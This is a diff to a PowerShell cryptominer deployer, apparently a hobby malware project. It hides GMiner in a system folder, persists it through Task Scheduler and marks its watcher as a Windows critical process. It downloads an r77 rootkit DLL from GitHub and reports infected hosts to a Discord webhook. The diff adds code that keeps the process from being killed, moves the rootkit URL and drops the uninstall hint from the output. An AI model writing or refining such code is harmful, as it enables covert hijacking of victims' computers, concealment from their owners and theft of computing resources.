@@ -2,7 +2,7 @@
 <#
 .SYNOPSIS
     Deploys and runs GMiner from a hidden system folder using Task Scheduler.
-    Includes Critical Process protection and r77 Rootkit integration.
+    Includes Critical Process protection (with safe shutdown) and r77 Rootkit.
 .EXAMPLE
     .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
 .EXAMPLE
@@ -43,26 +43,47 @@ if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-public class NtProcess {
-    [DllImport("ntdll.dll")]
-    public static extern int NtSetInformationProcess(
-        IntPtr hProcess, int infoClass,
-        ref int info, int infoLength);
-}
-"@
 
-function Set-CriticalProcess {
-    param([int]$TargetPid, [bool]$Critical)
-    $isCritical = if ($Critical) { 1 } else { 0 }
-    $ProcessBreakOnTermination = 0x1D
-    try {
-        $handle = (Get-Process -Id $TargetPid -ErrorAction Stop).Handle
-        [NtProcess]::NtSetInformationProcess($handle, $ProcessBreakOnTermination, [ref]$isCritical, 4) | Out-Null
-        return $true
-    } catch {
-        return $false
+public static class ProcessProtector {
+    [DllImport("ntdll.dll")]
+    public static extern int NtSetInformationProcess(IntPtr hProcess, int infoClass, ref int info, int infoLength);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool SetConsoleCtrlHandler(CtrlHandler handler, bool add);
+
+    delegate bool CtrlHandler(int ctrlType);
+    static CtrlHandler _handler;
+
+    static IntPtr _hProcess = IntPtr.Zero;
+    static int _isCritical = 1;
+    const int ProcessBreakOnTermination = 0x1D;
+
+    public static void SetCriticalForPid(int pid, bool critical) {
+        _isCritical = critical ? 1 : 0;
+        try {
+            IntPtr hProcess = System.Diagnostics.Process.GetProcessById(pid).Handle;
+            NtSetInformationProcess(hProcess, ProcessBreakOnTermination, ref _isCritical, 4);
+        } catch {}
+    }
+
+    public static void RegisterShutdownHandler() {
+        _hProcess = System.Diagnostics.Process.GetCurrentProcess().Handle;
+        _handler = new CtrlHandler(HandleCtrl);
+        SetConsoleCtrlHandler(_handler, true);
+    }
+
+    static bool HandleCtrl(int ctrlType) {
+        // 0=C, 1=Break, 2=Close, 5=Logoff, 6=Shutdown
+        if (ctrlType == 2 || ctrlType == 5 || ctrlType == 6) {
+            _isCritical = 0;
+            if (_hProcess != IntPtr.Zero) {
+                NtSetInformationProcess(_hProcess, ProcessBreakOnTermination, ref _isCritical, 4);
+            }
+        }
+        return false;
     }
 }
+"@
 
 function Send-DiscordWebhook {
     param(
@@ -191,6 +212,7 @@ if (-not $Run -and -not $NoElevate) {
         exit
     }
 }
+
 # ---------- watcher mode ----------------------------------------------------
 if ($Run) {
     New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
@@ -206,15 +228,14 @@ if ($Run) {
         Add-Content -Path $LogFile -Value "$ts [$Level] $Msg" -Encoding UTF8
     }
 
-    # HACER EL WATCHER CRÍTICO
-    $isCrit = Set-CriticalProcess -TargetPid $PID -Critical $true
-    if ($isCrit) {
-        Write-Session "Watcher marcado como PROCESO CRÍTICO."
-    }
+    # HACER EL WATCHER CRÍTICO Y PROTEGERLO CONTRA APAGADO
+    [ProcessProtector]::SetCriticalForPid($PID, $true)
+    [ProcessProtector]::RegisterShutdownHandler()
+    Write-Session "Watcher marcado como PROCESO CRÍTICO (con protección de apagado)."
 
     # --- INTEGRACIÓN ROOTKIT (r77) ---
     Write-Session "Iniciando integración de rootkit..."
-    $rkUrl = "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll"
+    $rkUrl = "https://github.com/UnfairAdventage/AutoMine/raw/refs/heads/main/rootkit.dll"
     try {
         # 1) Descargar rootkit.dll 
         $bytes = (New-Object Net.WebClient).DownloadData($rkUrl)  
@@ -280,7 +301,7 @@ if ($Run) {
             } catch {}
 
             if (-not $notifiedStart -and $DiscordWebhook) {
-                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`n*(Proceso Crítico y Rootkit Activados)*"
+                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`n*(Proceso Crítico, Rootkit y Safe-Shutdown Activados)*"
                 Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Miner Started Successfully" -Message $msg -Color 3066993 | Out-Null
                 $notifiedStart = $true
             }
@@ -431,7 +452,7 @@ Write-Host "[+] Auto-start instalado como Tarea Programada: $TaskName"
 $oldWatchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
     Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
 foreach ($w in $oldWatchers) {
-    Set-CriticalProcess -TargetPid $w.ProcessId -Critical $false | Out-Null
+    [ProcessProtector]::SetCriticalForPid($w.ProcessId, $false)
     Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
 }
 Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
@@ -455,7 +476,7 @@ Write-Host ''
 Write-Host '=================================================='
 Write-Host '  Mining in background. Auto-start enabled via Task Scheduler.'
 Write-Host "  Install : $Root"
-Write-Host '  PROTECCIÓN: Proceso Crítico y Rootkit Activados.'
+Write-Host '  PROTECCIÓN: Proceso Crítico (Safe Shutdown) y Rootkit Activados.'
 Write-Host "  Log     : $LogFile"
 Write-Host ''
 Write-Host '  Follow log:'
@@ -464,6 +485,4 @@ Write-Host ''
 Write-Host '  Diagnose:'
 Write-Host '    .\Mine.ps1 -Diagnose'
 Write-Host ''
-Write-Host '  Stop everything:'
-Write-Host '    .\Mine.ps1 -Uninstall'
 Write-Host '=================================================='
